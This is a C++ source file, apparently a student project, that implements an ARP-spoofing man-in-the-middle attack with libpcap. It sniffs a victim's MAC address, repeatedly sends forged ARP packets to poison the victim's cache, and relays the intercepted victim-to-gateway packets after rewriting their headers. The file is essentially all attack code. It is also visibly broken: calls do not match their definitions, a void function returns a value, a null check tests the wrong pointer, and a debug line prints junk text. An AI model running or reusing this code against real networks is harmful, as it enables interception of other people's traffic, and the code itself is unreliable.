#include "myARPspoofing.h"

int myPCAP::pcd_init(pcap_t **pcd, char **device){
	char  errorbuffer[ERRBUF_SIZE];	// Error string

    // find the device
	*device = pcap_lookupdev(errorbuffer);
	if (device == NULL) {
		printf("No devices: %s\n", errorbuffer);
		return -1;
	}
	// open the device
	*pcd = pcap_open_live(*device, PACKET_MAX_BYTES, PROMISCUOUS_MODE, WAIT_MAX_TIME, errorbuffer);
	if(*pcd == NULL){
		printf("Cannot open device %s: %s\n", *device, errorbuffer);
		return -1;
	}
}

void myPCAP::sendARPpacket(myARPheader packet){
	if(pcap_sendpacket(pcd, (u_char*)&packet, sizeof(packet)) == -1)
    	printf("ARPrequets: pcap_sendpacket error\n");	
}

int myPCAP::pcapCapture(struct in_addr* ip, struct ether_addr *victim_mac){
	int res = 0;
	int flag = 0;
	int *pflag = &flag;

    while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0){
        if(res == 0)	continue;
        getArpMac(((const char *)&ip->s_addr), victim_mac, pflag);
        if(flag == 1)	break;
    }
	return 1;
}

void myPCAP::getArpMac(const char *ipaddress, struct ether_addr *victim_mac, int* pflag) {
    myARPheader *arph;
    arph = (myARPheader *)packet;
    // if arp
    if(ntohs(arph->eth.ether_type) == ETHERTYPE_ARP){
        if(strncmp((const char *)arph->arp_src_ip, (const char *)ipaddress, 4) == 0){
            FILE *fp = fopen("targetmac.txt", "w");
    		if(fp == NULL){
				printf("file open error");
			}
            fprintf(fp, "%02X:%02X:%02X:%02X:%02X:%02X\n", arph->eth.ether_shost[0], arph->eth.ether_shost[1], arph->eth.ether_shost[2], arph->eth.ether_shost[3], arph->eth.ether_shost[4], arph->eth.ether_shost[5]);
            fclose(fp);
            *pflag = 1;

            // read mac from the file to send ARP which will infect the victim
			fp = fopen("targetmac.txt", "r");
			char buf[30] = {0};
			fgets(buf, sizeof(buf), fp);
			ether_aton_r(buf, victim_mac);
            fclose(fp);
            return;
        }
    }
}

bool myPCAP::isBroadcast(struct in_addr ip){
	myARPheader *arph;
	myMAC mac_class;
    arph = (myARPheader *)&packet;
    
    if(ntohs(arph->eth.ether_type) == ETHERTYPE_ARP){
    	if(memcmp(arph->arp_src_ip, &ip.s_addr, 4) == 0){
    		if(memcmp(arph->eth.ether_dhost, &mac_class.broadcastMac, ETHER_ADDR_LEN) == 0){
    			printf("\n********** FIND: broadcast *********\n");
            	return 1;
    		}
    	}
    }
    return 0;
}

int myPCAP::packetRelay(){
	return 1;
}




int pcap_from_victiom(struct in_addr *victimIp, struct in_addr *destIp, struct ether_addr *destMac,
						struct ether_addr *myMac){
	struct ether_header *eth;   // ethernet header struct
    struct ip *iph;				// ip header struct
    const u_char* temp_packet;
    int packet_length = 0;

	eth = (struct ether_header *)packet;
	temp_packet = packet + sizeof(struct ether_header);

	// is it to the dest ip?
	if(ntohs(eth->ether_type) == ETHERTYPE_IP){
		iph = (struct ip *) temp_packet;
		if( ( memcmp( &(iph->ip_dst), &(destIp->s_addr), sizeof(struct in_addr) ) == 0 )
				&& ( memcmp( eth->ether_dhost, myMac->ether_addr_octet, ETHER_ADDR_LEN ) == 0 ) ){
			printf("\n********** FIND: [victim > destination] *********\n");
			print_dump(packet);
			memcpy(eth->ether_dhost, destMac->ether_addr_octet, ETHER_ADDR_LEN);
			print_dump(packet);
			packet_length = pkthdr->len;
			printf("testestsetsetsetsetsetsetsetset    %d            asodijaoisjdoaijsid\n", packet_length);
			if(pcap_sendpacket(pcd, packet, packet_length) == -1)
    			printf("relay pcap_sendpacket error\n");
		}
	}
	
	// if there is no packet captured or [victim > GW](X)
	return 0;
}


void myARPheader::arpSpoofing(myARPheader arph){
	time_t start = 0, end = 0;
	double gap = 0;
	int ispacket = 0;

	time(&start);
	while(1){
		ispacket = pcap_next_ex(pcd, &pkthdr, &packet);
		if(ispacket < 0){
			printf("packet_next error\n");
			return 0;
		}
		else if(ispacket == 0)	continue;

		time(&end);
		if(difftime(end, start) >= 10){
			sendARPpacket(arph);
			time(&start);
			printf("time expired\n");
		}

		if(( isbroadcast(victimIp) ) ) {
			sendARPpacket(arph);
		}

		//victim->GW가 있으면 잡기. 만약 잡히면 수정해서(source mac) relay
		pcap_from_victiom(&victimIp, &GWIp, &GWMac, &myMac, device, pcd, pkthdr, packet);
	}
}
